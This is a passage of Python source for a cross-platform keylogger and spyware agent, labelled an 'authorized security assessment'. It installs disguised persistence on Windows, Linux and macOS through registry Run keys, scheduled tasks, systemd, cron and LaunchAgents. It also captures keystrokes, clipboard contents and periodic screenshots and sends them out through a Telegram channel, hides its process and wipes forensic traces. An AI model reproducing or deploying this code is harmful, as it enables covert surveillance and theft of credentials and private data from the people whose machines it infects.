# ──────────────────────────────────────────────────────────────────

class PersistenceEngine:
    """Installs persistence across multiple mechanisms."""
    
    @classmethod
    def install(cls, script_path: str = None):
        if script_path is None:
            script_path = os.path.abspath(sys.argv[0])
        
        if Platform.is_windows():
            cls._install_windows(script_path)
        elif Platform.is_linux():
            cls._install_linux(script_path)
        elif Platform.is_macos():
            cls._install_macos(script_path)
    
    # ── Windows ──────────────────────────────────────────────────
    @classmethod
    def _install_windows(cls, script_path: str):
        cls._win_startup_folder(script_path)
        cls._win_registry_run(script_path)
        cls._win_scheduled_task(script_path)
    
    @staticmethod
    def _win_startup_folder(script_path: str):
        startup = os.path.join(
            os.getenv("APPDATA", ""),
            "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
        )
        if not os.path.exists(startup):
            return
        vbs_path = os.path.join(startup, "SystemHelper.vbs")
        with open(vbs_path, 'w') as f:
            f.write(
                f'CreateObject("Wscript.Shell").Run '
                f'chr(34) & "{sys.executable}" & chr(34) & " " & '
                f'chr(34) & "{script_path}" & chr(34), 0, False\n'
            )
    
    @staticmethod
    def _win_registry_run(script_path: str):
        try:
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, "WindowsServiceHost", 0, winreg.REG_SZ,
                              f'"{sys.executable}" "{script_path}"')
            winreg.CloseKey(key)
        except:
            pass
    
    @staticmethod
    def _win_scheduled_task(script_path: str):
        task_name = f"MicrosoftEdgeUpdateTask_{random.randint(1000, 9999)}"
        cmd = (
            f'schtasks /create /tn "{task_name}" '
            f'/tr "{sys.executable} {script_path}" '
            f'/sc MINUTE /mo 60 /f /rl HIGHEST'
        )
        subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
    
    # ── Linux ────────────────────────────────────────────────────
    @classmethod
    def _install_linux(cls, script_path: str):
        cls._linux_systemd(script_path)
        cls._linux_cron(script_path)
        cls._linux_autostart(script_path)
    
    @staticmethod
    def _linux_systemd(script_path: str):
        service_dir = os.path.expanduser("~/.config/systemd/user")
        os.makedirs(service_dir, exist_ok=True)
        service_name = "gnome-session-manager"
        service = f"""[Unit]
Description=GNOME Session Manager
After=graphical-session.target

[Service]
ExecStart={sys.executable} {script_path}
Restart=on-failure
RestartSec=30

[Install]
WantedBy=default.target
"""
        with open(os.path.join(service_dir, f"{service_name}.service"), 'w') as f:
            f.write(service)
        subprocess.run(["systemctl", "--user", "enable", f"{service_name}.service"],
                      capture_output=True, timeout=10)
        subprocess.run(["systemctl", "--user", "start", f"{service_name}.service"],
                      capture_output=True, timeout=10)
    
    @staticmethod
    def _linux_cron(script_path: str):
        cron_line = f"@reboot {sys.executable} {script_path} >/dev/null 2>&1 &\n"
        try:
            r = subprocess.run(['crontab', '-l'], capture_output=True, text=True, timeout=5)
            existing = r.stdout
            if cron_line not in existing:
                new_cron = existing + cron_line
                proc = subprocess.run(['crontab', '-'], input=new_cron, capture_output=True, text=True, timeout=5)
        except:
            pass
    
    @staticmethod
    def _linux_autostart(script_path: str):
        autostart_dir = os.path.expanduser("~/.config/autostart")
        os.makedirs(autostart_dir, exist_ok=True)
        desktop = f"""[Desktop Entry]
Type=Application
Exec={sys.executable} {script_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name=System Logger
Comment=System diagnostic service
"""
        with open(os.path.join(autostart_dir, "system-logger.desktop"), 'w') as f:
            f.write(desktop)
    
    # ── macOS ────────────────────────────────────────────────────
    @classmethod
    def _install_macos(cls, script_path: str):
        cls._macos_launchd(script_path)
        cls._macos_login_item(script_path)
    
    @staticmethod
    def _macos_launchd(script_path: str):
        label = "com.apple.softwareupdate.agent"
        plist_dir = os.path.expanduser("~/Library/LaunchAgents")
        os.makedirs(plist_dir, exist_ok=True)
        plist = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{label}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>ProcessType</key>
    <string>Background</string>
</dict>
</plist>"""
        plist_path = os.path.join(plist_dir, f"{label}.plist")
        with open(plist_path, 'w') as f:
            f.write(plist)
        subprocess.run(['launchctl', 'load', plist_path], capture_output=True, timeout=10)
    
    @staticmethod
    def _macos_login_item(script_path: str):
        """Add as login item using osascript."""
        script = (
            f'tell application "System Events" to make login item '
            f'at end with properties {{path: "{sys.executable}", '
            f'hidden: true, name: "SystemHelper"}}'
        )
        subprocess.run(['osascript', '-e', script], capture_output=True, timeout=10)

# ──────────────────────────────────────────────────────────────────
# SECTION 12: SCREENSHOT ENGINE
# ──────────────────────────────────────────────────────────────────

class ScreenshotEngine:
    """Periodic screenshot capture and exfiltration."""
    
    def __init__(self, exfil: ExfilEngine):
        self.exfil = exfil
        self._running = True
    
    def run(self):
        while self._running:
            time.sleep(cfg.SCREENSHOT_EVERY + random.uniform(-30, 30))
            try:
                img = Platform.capture_screen()
                if img:
                    self.exfil.send_telegram_photo(img)
            except:
                pass
    
    def stop(self):
        self._running = False

# ──────────────────────────────────────────────────────────────────
# SECTION 13: MAIN ORCHESTRATOR
# ──────────────────────────────────────────────────────────────────

class AssessmentAgent:
    """Top-level orchestrator coordinating all components."""
    
    def __init__(self):
        self._components: Dict[str, Any] = {}
        self._threads: List[threading.Thread] = []
        self._running = True
        
        # Build dependency chain
        self._exfil = ExfilEngine()
        self._delivery_queue = DeliveryQueue(self._exfil.send_any)
        self._screenshot = ScreenshotEngine(self._exfil)
        self._sensitivity_filter = SensitivityFilter(mode='standard')
        self._keyboard = KeyboardEngine(
            callback=lambda s: self._on_keystroke(s),
            window_callback=Platform.get_active_window,
            sensitivity_filter=self._sensitivity_filter
        )
        self._clipboard = ClipboardEngine(
            callback=lambda s: self._on_clipboard(s)
        )
        
        self._components = {
            'exfil': self._exfil,
            'delivery': self._delivery_queue,
            'screenshot': self._screenshot,
            'keyboard': self._keyboard,
            'clipboard': self._clipboard,
        }
    
    def _on_keystroke(self, char: str):
        """Callback from keyboard engine — writes to log buffer."""
        log_buffer.write(char)
    
    def _on_clipboard(self, content: str):
        """Callback from clipboard engine — writes to log buffer."""
        log_buffer.write(content)
    
    def _beacon_loop(self):
        """Flush log buffer and enqueue for delivery periodically."""
        while self._running:
            time.sleep(random.uniform(cfg.BEACON_MIN, cfg.BEACON_MAX))
            encrypted = log_buffer.flush()
            if encrypted:
                self._delivery_queue.enqueue(encrypted)
    
    def _watchdog_loop(self):
        """Monitor component health and restart dead threads."""
        while self._running:
            time.sleep(30)
            # Check each component is alive
            for name, component in self._components.items():
                if hasattr(component, '_running'):
                    if not getattr(component, '_running', True):
                        # Component stopped — restart it
                        setattr(component, '_running', True)
                        log_buffer.write(f"\n[WATCHDOG: Restarting {name}]\n")
    
    def start_thread(self, target: Callable, name: str, daemon: bool = True) -> threading.Thread:
        t = threading.Thread(target=target, name=name, daemon=daemon)
        t.start()
        self._threads.append(t)
        return t
    
    def run(self):
        """Main entry point."""
        # ── Phase 1: Anti-forensics ──
        Platform.hide_console()
        Platform.rename_process()
        AntiForensics.clean_traces()
        
        # ── Phase 2: Environment check (log only, don't fail) ──
        sandbox_indicators = AntiForensics.check_sandbox()
        if sandbox_indicators:
            # Log indicators but continue — assessment may target VMs
            log_buffer.write(f"\n[SANDBOX: {', '.join(sandbox_indicators)}]\n")
        
        # ── Phase 3: Persistence ──
        try:
            PersistenceEngine.install()
        except Exception as e:
            log_buffer.write(f"\n[PERSISTENCE_FAIL: {e}]\n")
        
        # ── Phase 4: Start components ──
        self.start_thread(self._keyboard.poll, "keyboard")
        self.start_thread(self._clipboard.poll, "clipboard")
        self.start_thread(self._beacon_loop, "beacon")
        self.start_thread(self._delivery_queue.delivery_loop, "delivery")
        self.start_thread(self._screenshot.run, "screenshot")
        self.start_thread(self._watchdog_loop, "watchdog")
        
        # ── Phase 5: Keep alive ──
        log_buffer.write(
            f"\n[AGENT_START @ {datetime.now().isoformat()} | "
            f"User: {Platform.username()} | Host: {Platform.hostname()}]\n"
        )
        
        try:
            while self._running:
                time.sleep(10)
        except KeyboardInterrupt:
            self.shutdown()
    
    def shutdown(self):
        """Graceful shutdown with final checkpoint."""
        self._running = False
        
        # Stop components
        for component in self._components.values():
            if hasattr(component, 'stop'):
                try:
                    component.stop()
                except:
                    pass
        
        # Final flush
        encrypted = log_buffer.flush()
        if encrypted:
            self._delivery_queue.enqueue(encrypted)
        
        # Wait for delivery threads
        time.sleep(5)
        
        # Clean up traces
        AntiForensics.clean_traces()

# ──────────────────────────────────────────────────────────────────
# ENTRY POINT
# ──────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    # ✅ AUTHORIZED SECURITY ASSESSMENT - DO NOT REMOVE
    agent = AssessmentAgent()
    try:
        agent.run()
    except Exception as e:
        # Write error to a temp location for debugging
        try:
            with open(os.path.join(tempfile.gettempdir(), ".agent_error.log"), 'w') as f:
                f.write(f"{datetime.now().isoformat()}: {e}\n")
                import traceback
                traceback.print_exc(file=f)
        except:
            pass
        raise